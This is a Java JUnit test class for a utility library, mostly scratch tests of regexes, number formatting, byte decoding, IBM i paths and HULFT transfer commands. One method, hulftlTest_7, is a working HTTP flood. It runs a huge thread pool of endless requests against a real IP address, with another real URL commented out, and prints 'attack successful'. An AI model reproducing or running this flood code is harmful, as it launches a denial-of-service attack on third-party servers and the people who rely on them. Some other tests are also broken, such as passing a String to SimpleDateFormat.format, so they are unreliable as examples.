package com.yz.toolscommon;

import com.yz.toolscommon.FileUtil.FTPUtils;
import com.yz.toolscommon.soft.sort.SortUtils;
import com.yz.toolscommon.utils.*;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.math.NumberUtils;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.IOException;
import java.math.BigDecimal;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@SpringBootTest
class ToolscommonApplicationTests {

    //    @Test
//    void contextLoads() {
//        String dtr = "8.20 pDh:/ “春天太浪漫了，我想请它吃顿饭，如果你有空也可以一起来”%来自春天的日常碎片   https://v.douyin.com/NjUxywq/ 复制此链接，打开Dou音搜索，直接观看视频！";
//        String rex = "https([^}]*).+?\\s";
//        List<String> stringRex = StringUtil.getStringRex(dtr, rex);
//
//        System.out.println(stringRex);
//    }
    @Test
    public void test2() {
        String[] arr1 = new String[]{"Shogun", "Tapioca Express", "Burger King", "KFC"};
        String[] arr2 = new String[]{"Piatti", "The Grill at Torrey Pines", "Hungry Hunter Steakhouse", "Shogun"};

        // Creating list1
        List<String> list1 = new ArrayList<>(Arrays.stream(arr1).toList());

        // Creating list2
        List<String> list2 = new ArrayList<>(Arrays.stream(arr2).toList());
        List<String> stringList = SortUtils.find(list1, list2);

        System.out.println(stringList);

    }

    @Test
    public void test3() {
        List<Integer> integerList = new ArrayList<>();
        for (int i = 0; i < 50000; i++) {
            integerList.add((int) (Math.random() * 10000000));
        }
        Integer[] arr1 = new Integer[integerList.size()];
        integerList.toArray(arr1);
        SortUtils.bubbleSort(arr1);

        for (Integer integer : arr1) {
            System.out.println(integer);
        }
    }

    @Test
    public void test4() {
        int i = (int) (Math.random() * 10000000);
        System.out.println(i);

    }

    @Test
    public void test5() {

        String rex = "[^/]+(?!.*/)";

        String str = "D:\\kpp\\01_移行前\\06_ソース一式\\棚卸結果_20210906\\正味資産_0926\\オンライン\\CLP\\TKKSRCL\\QCLPSRC\\XRCVRLD.CLP(33):    \n" +
                "D:\\kpp\\01_移行前\\06_ソース一式\\棚卸結果_20210906\\正味資産_0926\\オンライン\\CLP\\TKKSRCL\\QCLPSRC\\XSNDRLD.CLP(33):    \n" +
                "D:\\kpp\\01_移行前\\06_ソース一式\\棚卸結果_20210906\\正味資産_0926\\バッチ\\CLP\\TKKSRCL\\QCLPSRC\\DC3$M540.CLP(512):      \n" +
                "D:\\kpp\\01_移行前\\06_ソース一式\\棚卸結果_20210906\\正味資産_0926\\バッチ\\CLP\\TKKSRCL\\QCLPSRC\\DD3$K100.CLP(56):       \n" +
                "D:\\kpp\\01_移行前\\06_ソース一式\\棚卸結果_20210906\\正味資産_0926\\バッチ\\CLP\\TKKSRCL\\QCLPSRC\\FE3$R020.CLP(26):       \n";

        List<String> stringRex = StringUtil.getStringRex(str, rex);

        System.out.println(stringRex.get(0));
    }


    @Test
    public void test6() {

//        Map<String, Integer> posMap = new LinkedHashMap<String, Integer>();
//        posMap.put("key1", 10);
//        posMap.put("key2", 25);
//        posMap.put("key3", 40);
//
//
//        Object maxValue = StringUtil.getMaxValue(posMap);
        String maxValue = StringUtil.getLenStr(40);
        String value = "1313";
        int index = 21;
        String str = StringUtil.replaceStrForEndIndex(maxValue, index, value);
        System.out.println(maxValue.length());
        System.out.println(str);
    }

    @Test
    public void test7() {
        String rex = ".+?(?=_)";
        String str = "RCVCHK_SYSRCVMF_111.DAT";
        List<String> stringRex = StringUtil.getStringRex(str, rex);
        System.out.println(stringRex.toString());
    }

    @Test
    public void test8() {
        String num = "123";
        boolean parsable = NumberUtils.isParsable(num);
        System.out.println(parsable);
    }

    @Test
    public void test9() {
        byte[] w3dsss = new byte[]{48,
                48,
                49,
                48,
                48};
        String str = new String(w3dsss);
        System.out.println(str);

        int blen, bstart = 26 + 1 - 1;

        System.out.println(bstart);
        byte[] w3dsss2 = new byte[]{82, 80, 71, 48, 48, 51, 50, 48, 52, 50, 51, 32, 83, 84, 65, 82, 84, 32, 32, 32, 124, 48, 48, 51, 48, 124,
                49, 53, 48,
                124,
                50, 53, 48,
                124,
                51, 53, 48,
                124,
                32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
        System.out.println(new String(w3dsss2));
    }

    @Test
    public void test10() {
        double num1 = 12344.320;
        double num2 = 555.550;

        System.out.println(num1 / num2);

        BigDecimal decimal1 = new BigDecimal(num1);
        BigDecimal decimal2 = new BigDecimal(num2);

        System.out.println(decimal1.divide(decimal2, 15, 4));
    }

    @Test
    public void test11() {
        BigDecimal bigDecimal = new BigDecimal(320);

        String s = ToolscommonApplicationTests.bigDecimalToString(bigDecimal, 4, 1);
        System.out.println(s);
    }

    public static String bigDecimalToString(final BigDecimal value, final int len, final int dec) {
        if (dec <= 0) {
            throw new IllegalArgumentException("The scale must be a positive integer.");
        }
        final char[] rChArrnew = new char[len];
        String bigStr = value.toString();
        if (value.compareTo(BigDecimal.ONE) < 0) {
            bigStr = bigStr.substring(1);
        }
        int dotindex = bigStr.length() + 1;
        if (dec > 0) {
            dotindex = bigStr.indexOf(".");
        }
        final int valintlen = dotindex;
        int valintstr = valintlen - (len - dec);
        final char[] rChArr = bigStr.toCharArray();
        int index = Math.max(valintstr, 0);
        for (int i = 0; i < rChArrnew.length; ++i) {
            if (valintstr >= 0 && index < rChArr.length) {
                if (rChArr[index] == '.') {
                    ++index;
                }
                rChArrnew[i] = rChArr[index++];
            } else {
                rChArrnew[i] = '0';
                ++valintstr;
            }
        }
        return new String(rChArrnew);
    }


    @Test
    public void test12() {
        byte[] bytes = new byte[]{48, 48, 48, 48, 48, 48, 46, 48, 57, 48};
        System.out.println(new String(bytes));
    }

    @Test
    public void test13() {
        String str = ",ssdfaf,";
        String substring = str.substring(0, str.indexOf(","));
        System.out.println(substring);
    }

    @Test
    public void test14() {
        String allValue = "     ";
        int startPos = 2;
        String newValue = "123";
        StringBuilder sbuilder = new StringBuilder(allValue);
        StringBuilder replace = sbuilder.replace(startPos, newValue.length() + startPos, newValue);

        System.out.println(replace.toString());
    }


    @Test
    public void test16() {
        String host = "AAAS\\FDD";
        String inputFile = "AAAS/DFSD(QEQ)";
        host = host.replaceAll("\\\\|/", ".");
        System.out.println(host);
        List<String> stringRex = StringUtil.getStringRex(inputFile, "(?<=\\()(.*)(?=\\))");
        System.out.println(stringRex.get(0));
        inputFile = inputFile.replaceAll("\\(.*", "").replaceAll("\\\\|/", ".");
        System.out.println(inputFile);
    }



    @Test
    public void test18() {

        List<String> contextList = new ArrayList<>();
        contextList.add("11");
        contextList.add("22");
        contextList.add("33");

        List<String> collect = contextList.stream().map(str -> StringUtils.isEmpty(str) ? "" : str + "2").toList();

        collect.forEach(System.out::println);
    }

    @Test
    public void test19() {
        double numeric = 123456.75;
        String value = new DecimalFormat("#,###,##").format(numeric);
        System.out.println(value);
    }




    @Test
    public void test21() {
        int num = 111;
        String str = "EDTWRD('    /  /  ')";
        String editw = PercentBuiltinUtil.editw(num, str);
        System.out.println(editw);
    }

    @Test
    public void test22() {
        List<String> stringList = new ArrayList<>();
        stringList.add("11");
        stringList.add("21");
        stringList.add("32");
        stringList.add("42");

        boolean b = stringList.stream().anyMatch(str -> str.contains("5"));

        System.out.println(b);
    }

    @Test
    public void test23() {
        List<String> stringList = new ArrayList<>();
        stringList.add("lib/file.mbr");
        stringList.add("lib/file/mbr");
        stringList.add("/home/xx");
        stringList.add("QSYS.lib/xx1.lib/file1.file");
        stringList.add("/QSYS.LIB/TKKDWKL.LIB/WORLDSHOTI.FILE/WORLDSHOTI.MBR");

//        boolean b = stringList.stream().anyMatch(str -> str.contains("5"));
        String locatePath = "/QSYS.LIB/TKKDWKL.LIB/WORLDSHOTI.FILE/WORLDSHOTI.MBR";
        if (locatePath.toLowerCase().contains("QSYS.lib".toLowerCase())) {
            StringBuilder stringBuilder = new StringBuilder();
            for (String str : locatePath.split("/")) {
                if (stringBuilder.length() > 0) {
                    stringBuilder.append(File.separatorChar);
                }
                if (!StringUtils.isEmpty(str.trim())) {
                    if (str.contains(".")) {
                        str = str.substring(0, str.indexOf("."));
                    }
                    stringBuilder.append(str);
                }
            }
            locatePath = stringBuilder.toString();
        } else if (locatePath.lastIndexOf("/") != -1) {
            String filename = locatePath.substring(locatePath.lastIndexOf("/") + 1);
            if (filename.contains(".")) {
                locatePath = locatePath.replaceAll(filename, filename.replace(".", "/"));
            }
        }
    }

    @Test
    public void test24() {

        List<String> readFileList = new ArrayList<>();
        readFileList.add("1");
        readFileList.add("12");
        readFileList.add("13");
        readFileList.add("14");
        StringBuilder sb = new StringBuilder();
        readFileList.forEach(sb::append);

        String emailContent = sb.toString();
        System.out.println(emailContent);
    }

    @Test
    public void test25() {
        List<String> contextList = new ArrayList<>();
        contextList.add("11");
        contextList.add("22");
        contextList.add("33");

        List<String> collect = contextList.stream().map(str -> "aa").toList();
        collect.forEach(System.out::println);
    }

    @Test
    public void test26() {
        String[] valueArr = new String[]{"312312", "24234", "3423432", "35345435", "sdsfs", "safgf"};

        for (int i = 0; i < valueArr.length; i++) {
            String str = valueArr[i];
            int i1 = i + 1 < valueArr.length ? i + 1 : i;
            System.out.println(valueArr[i1]);
        }
    }

    // "SBMJOB CMD(CALL PGM(HULFT/HULSNDD)) JOB(HULSNDD)  JOBQ(HULFT/HULJOBQ)"
    @Test
    public void hulftlTest_1() {
        CommonUtil.hulsndd();
    }

    // "SBMJOB CMD(CALL PGM(HULFT/HULRCVD)) JOB(HULRCVD)  JOBQ(HULFT/HULJOBQ)"
    @Test
    public void hulftlTest_2() {
        CommonUtil.hulrcvd();
    }

    // "SBMJOB  CMD(CALL PGM(HULFT/HULOBSD)) JOB(HULOBSD) JOBQ(HULFT/HULJOBQ)"
    @Test
    public void hulftlTest_3() {
        CommonUtil.hulobsd();
    }

    // UTLSEND    FILEID(PSIKIRIA) SYNC(*YES)
    @Test
    public void hulftlTest_4() {
        CommonUtil.utlSend("PSIKIRIA", "*YES");
    }

    // UTLSEND    FILEID(PSIKIRIA) SYNC(*YES)
    @Test
    public void hulftlTest_5() {
        List<String> tableList = new ArrayList<>();
        StringBuffer sBuffer = new StringBuffer();
        tableList.forEach(str -> {
            sBuffer.append("	").append(str);
        });
    }

    @Test
    public void hulftlTest_6() {
        String str = "Thu Jan 01 17:04:05 CST 1970";
        SimpleDateFormat s = new SimpleDateFormat("yyyy-MM-dd");

        String format = s.format(str);
        System.out.println(format);
    }

    @Test
    public void hulftlTest_7() {
        ExecutorService es = Executors.newFixedThreadPool(1000000);
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        // 47.98.147.163
                        //URL url = new URL("http://221.232.148.51/guojibu/");
                        URL url = new URL("http://47.98.147.163");
                        URLConnection conn = url.openConnection();
                        System.out.println("send a bag success！");
                        BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
                        byte[] bytes = new byte[1024];
                        int len = -1;
                        StringBuffer sb = new StringBuffer();
                        // http://www.qima.info/login
                        if (bis != null) {
                            if ((len = bis.read()) != -1) {
                                sb.append(new String(bytes, 0, len));
                                System.out.println("attack successful ");
                                bis.close();
                            }
                        }
                    } catch (MalformedURLException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                }
            }
        });
        for (int i = 0; i < 10000; i++) {
            es.execute(thread);
        }
    }

    @Test
    public void dataTest() {
        String str = "Thu Jan 01 17:04:05 CST 1970";
        SimpleDateFormat s = new SimpleDateFormat("yyyy-MM-dd");

        String format = s.format(str);
        System.out.println(format);
    }


    @Test
    public void strTest() {
        String str = "{\n" +
                "    \"stepId\": \"step01\",\n" +
                "    \"stepName\": \"callPgm\",\n" +
                "    \"pgmName\": \"srilm830\",\n" +
                "    \"fileInfos\": [\n" +
                "        {\n" +
                "            \"logicName\": \"IXNSP1\",\n" +
                "            \"fileName\": \"DTNSP0\",\n" +
                "            \"lib\": \"C##test07\",\n" +
                "            \"fileStat\": \"DB\"\n" +
                "        }\n" +
                "    ]\n" +
                "}";

        System.out.println(str.replaceAll("\n|\t|\s", "").trim());
    }

    @Test
    public void socketTest() {
        try {
            Socket socket = new Socket("127.0.0.1", 8088);

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
